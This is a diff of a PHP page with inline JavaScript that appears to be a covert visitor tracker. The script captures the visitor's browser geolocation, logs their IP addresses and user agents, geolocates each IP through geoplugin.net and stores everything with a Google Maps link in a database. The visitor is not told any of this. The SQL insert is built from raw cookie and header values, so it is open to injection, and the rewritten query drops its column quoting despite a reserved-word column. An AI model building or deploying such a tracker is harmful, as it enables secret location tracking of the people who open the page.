@@ -1,7 +1,8 @@
-<script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});</script>
+<script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});document.cookie="a=1";</script>
 <?php
 $lat = NULL;
 $lon = NULL;
+$a = NULL;
 $client = NULL;
 $xforf = NULL;
 $xfor = NULL;
@@ -38,6 +39,7 @@ global $HTTP_SERVER_VARS;
 global $HTTP_USER_AGENT;
 $lat = $_COOKIE['lat'];
 $lon = $_COOKIE['lon'];
+$a = $_COOKIE['a'];
 $client = $_SERVER['HTTP_CLIENT_IP'];
 $xforf = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $xfor = $_SERVER['HTTP_X_FORWARDED'];
@@ -48,7 +50,7 @@ $ipa = $_GET['addr'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $hagent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
 $gagent = $HTTP_USER_AGENT;
-if ($lon == NULL){header("Refresh:5");}else{
+if ($a == NULL){header("Refresh:5");}else{
 $google = "https://maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
 $clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
@@ -87,7 +89,7 @@ if ($ipav6 != 0){
 $ipav6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}}
 include 'huMf6GwI0pbSg1k.php';
 $conn = OpenCon();
-$sql = "INSERT INTO `track` (`client`,`xforf`,`xfor`,`forf`,`for`,`ip`,`ipa`,`lat`,`lon`,`google`,`clientv6`,`xforfv6`,`xforv6`,`forfv6`,`forv6`,`ipv6`,`ipav6`,`agent`,`hagent`,`gagent`,`clientgeo`,`xforfgeo`,`xforgeo`,`forfgeo`,`forgeo`,`ipgeo`,`ipageo`,`clientv6geo`,`xforfv6geo`,`xforv6geo`,`forfv6geo`,`forv6geo`,`ipv6geo`,`ipav6geo`) VALUES ('$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo')";
+$sql = "INSERT INTO track(client,xforf,xfor,forf,for,ip,ipa,lat,lon,google,clientv6,xforfv6,xforv6,forfv6,forv6,ipv6,ipav6,agent,hagent,gagent,clientgeo,xforfgeo,xforgeo,forfgeo,forgeo,ipgeo,ipageo,clientv6geo,xforfv6geo,xforv6geo,forfv6geo,forv6geo,ipv6geo,ipav6geo) VALUES ('$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo')";
 if(mysqli_query($conn, $sql)){
     echo "Records added successfully.";
 }else{
